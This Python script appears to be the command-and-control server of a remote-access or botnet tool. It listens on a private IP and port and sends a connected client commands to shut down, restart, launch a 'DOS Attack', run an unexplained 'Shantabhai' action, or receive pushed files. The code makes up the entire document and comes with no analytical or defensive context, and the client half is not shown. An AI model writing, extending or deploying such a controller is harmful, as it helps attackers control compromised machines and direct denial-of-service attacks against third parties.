import time
import socket
import os
import platform

# Server Code

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "10.250.14.55"
    port = 8080
    
    try:
        s.bind((host, port))
        print("\nWaiting for incoming connection...")
        s.listen(10)
        conn, addr = s.accept()
        print("\nClient is connected to the server now...\n")
        
        while True:
            print("Waiting for command...")
            choice = input("1. Shutdown\n2. Restart\n3. DOS Attack\n4. Shantabhai\n5. Send File\n6. Exit\nEnter your choice: ")
            
            if choice == "1":
                conn.sendall("shutdown".encode())
            elif choice == "2":
                conn.sendall("restart".encode())
            elif choice == "3":
                conn.sendall("DOS Attack".encode())
            elif choice == "4":
                conn.sendall("Shantabhai".encode())
            elif choice == "5":
                conn.sendall("file_transfer".encode())
                file_path = input("Enter the file path to send: ")
                
                if os.path.exists(file_path):
                    file_name = os.path.basename(file_path)
                    file_size = os.path.getsize(file_path)
                    conn.sendall(f"{file_name}|{file_size}".encode())
                    
                    # Wait for acknowledgment from client
                    ack = conn.recv(1024).decode()
                    if ack == "READY":
                        with open(file_path, "rb") as f:
                            while (data := f.read(1024)):
                                conn.sendall(data)
                        print("File sent successfully!\n")
                    else:
                        print("Client not ready for file transfer.\n")
                else:
                    print("File not found!\n")
            elif choice == "6":
                conn.sendall("exit".encode())
                break
            else:
                print("Enter a valid choice.\n")
        
    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        conn.close()
        s.close()

if __name__ == "__main__":
    start_server()
